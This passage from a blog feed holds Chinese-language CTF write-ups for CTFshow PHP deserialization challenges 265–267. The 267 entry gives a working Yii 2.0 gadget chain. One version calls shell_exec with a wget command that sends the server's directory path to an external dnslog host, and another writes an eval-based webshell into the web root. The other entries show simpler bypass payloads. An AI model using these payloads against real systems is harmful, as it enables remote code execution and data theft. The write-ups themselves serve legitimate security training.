      </categories>
      
      
        <tags>
            
            <tag> 反序列化wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化-13</title>
      <link href="/2023/06/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-13/"/>
      <url>/2023/06/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-13/</url>
      
        <content type="html"><![CDATA[<h2 id="题目来源：CTFshow-web入门-php反序列化-267"><a href="#题目来源：CTFshow-web入门-php反序列化-267" class="headerlink" title="题目来源：CTFshow web入门-php反序列化-267"></a>题目来源：CTFshow web入门-php反序列化-267</h2><p>打开环境，发现值一个有模有样的界面，找到一个登录界面，尝试使用弱密码后得到账户和密码：admin，admin。登录成功后，查看源码，发现代码块与之前不一样了，多了一个 <!--view-source -->  。将其加入url中得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///backdoor/shell</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))</span><br></pre></td></tr></table></figure><p>则这里就是我们序列化利用的点。再分析源码，发现网页使用的js框架结构是 yii 框架，打开查看版本是2.0 版本，于是可以到网上查找这个框架的链子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;            </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>]= [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将其值传入url得到：</p><p><img src="/../imgs/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-13/03.png"></p><p>证明链子中的 phpino 执行成功，于是更改链子中的值，带外查看该网页的目录：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;              </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;    </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;shell_exec&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;wget `pwd|base64`.9vcznr.dnslog.cn&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>]= [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到结果后base64解码得到网页的目录：</p><p><img src="/../imgs/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-13/04.png"></p><p><img src="/../imgs/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-13/05.png"></p><p>网页目录：&#x2F;var&#x2F;www&#x2F;html&#x2F;basic&#x2F;web</p><p>于是我们可以尝试执行恶意代码向其写入文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;              </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;    </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;shell_exec&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;echo &quot;&lt;?php eval(\$_POST[1]);phpinfo();?&gt;&quot; &gt; /var/www/html/basic/web/2.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>]= [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>再打开2.php页面，只用一句话木马输出flag:</p><p><img src="/../imgs/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-13/06.png"></p><p>flag：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;a658a1fb-<span class="number">063</span>c-<span class="number">48</span>ac-<span class="number">99</span>c1-<span class="number">1</span>fa31f05dc06&#125; </span><br></pre></td></tr></table></figure><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>这题难度比较适中，首先利用了弱口令，再根据源码提示，找到反序列化的利用点，再利用yii链子，成功执行我们的代码。一天一个知识。以上文章若有不足、错误的地方，欢迎大家留言指正，我会第一时间改正。我希望大家一起共同进步。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化-12</title>
      <link href="/2023/06/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-12/"/>
      <url>/2023/06/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-12/</url>
      
        <content type="html"><![CDATA[<h2 id="题目来源：CTFshow-web入门-php反序列化-266"><a href="#题目来源：CTFshow-web入门-php反序列化-266" class="headerlink" title="题目来源：CTFshow web入门-php反序列化-266"></a>题目来源：CTFshow web入门-php反序列化-266</h2><p>题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cs</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfshowo</span>=@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cs</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析源码，发现同时存在魔术方法，我们想要的flag在原生类魔术方法 __destruct() 中，但是源码中的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会检测我们的数据，如果存在字符串集：”ctfshow” 则会进行报错，并且返回的错误信息是以 “Error” 开头，带上我们的数据的提示。为了成功执行我们的 __destruct() 方法，就必须绕过这个正则，自习观察，该正则中没有添加 “\i” ，意味着区分大小写，那直接大小写绕过即可，开始构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfSHOW</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由于页面并没有可以传参利用的点，那我们直接BP抓包，带上我们的数据即可：</p><p><img src="/../imgs/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-12/02.png"></p><p>flag：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;bdad6c73-<span class="number">4</span>d0c-<span class="number">4572</span>-b929-a89625c01b98&#125;</span><br></pre></td></tr></table></figure><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>这一题比较基础，考察了php正则表达式的简单绕过和魔术方法的触发。以上文章若有不足、错误，欢迎大家留言指正，我会第一时间改正，希望大家共同进步。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化-11</title>
      <link href="/2023/06/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-11/"/>
      <url>/2023/06/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-11/</url>
      
        <content type="html"><![CDATA[<h2 id="题目来源：CTFshow-web入门-php反序列化-265"><a href="#题目来源：CTFshow-web入门-php反序列化-265" class="headerlink" title="题目来源：CTFshow web入门-php反序列化-265"></a>题目来源：CTFshow web入门-php反序列化-265</h2><p>题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;<span class="title function_ invoke__">login</span>())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析源码，发现者题的关键点并不在魔术方法，而是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ctfshow</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br></pre></td></tr></table></figure><p>它将token的值通过函数 mt_rand() 随机生成了一个字符串，又将其md5加密，如果 $password 的值与值相同，则输出flag。想都不用想，凭人工输入怎么可能使他们两个值相同，因此我们需要采用一点绕过方式。</p><p>思路：让 $password 的地址指向 $token 的地址，类似于C语言的指针，就能让两个参数的值相等，因此，开始构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = &amp;<span class="variable language_">$this</span>-&gt;token;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshowAdmin</span>(<span class="string">&#x27;123&#x27;</span>,<span class="string">&#x27;123&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将得到的值提交给服务器，即可获得flag：</p><p><img src="/../imgs/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-11/01.png"></p><p>flag：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;<span class="number">7</span>f36010c-<span class="number">9852</span>-<span class="number">422</span>c-<span class="number">8481</span>-<span class="number">33</span>b3c93b97da&#125;</span><br></pre></td></tr></table></figure><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>这一题给我提供了另一种绕过的思维，相信在今后再次遇到类似的题目时能快速找到方法解决。以上文章若有不足、错误，欢迎大家留言，我会及时改正，大家一起共同进步。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化-10</title>
      <link href="/2023/06/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-10/"/>
      <url>/2023/06/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-10/</url>
      
        <content type="html"><![CDATA[<h2 id="题目来源：CTFshow-web入门-php反序列化-264"><a href="#题目来源：CTFshow-web入门-php反序列化-264" class="headerlink" title="题目来源：CTFshow web入门-php反序列化-264"></a>题目来源：CTFshow web入门-php反序列化-264</h2><p>题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span 